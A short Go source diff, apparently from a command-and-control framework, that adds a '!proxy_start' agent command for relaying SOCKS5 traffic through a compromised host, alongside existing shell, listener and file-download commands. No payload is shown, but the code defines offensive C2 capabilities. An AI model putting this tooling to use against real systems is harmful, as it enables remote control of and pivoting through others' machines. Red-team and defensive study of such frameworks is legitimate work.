@@ -20,5 +20,9 @@ const (
 	C2CmdStat           = "!stat"
 	C2CmdListener       = "!listener"
 	C2CmdFileDownloader = "!file_downloader"
-	C2CmdShell          = "!shell" // interactive PTY shell session (web virtual terminal)
+
+	// C2CmdProxyStart orders the agent to dial a target and open a dedicated
+	// C2 relay stream (Proxy route) so the C2 can forward SOCKS5 traffic to it.
+	C2CmdProxyStart = "!proxy_start"
+	C2CmdShell      = "!shell" // interactive PTY shell session (web virtual terminal)
 )
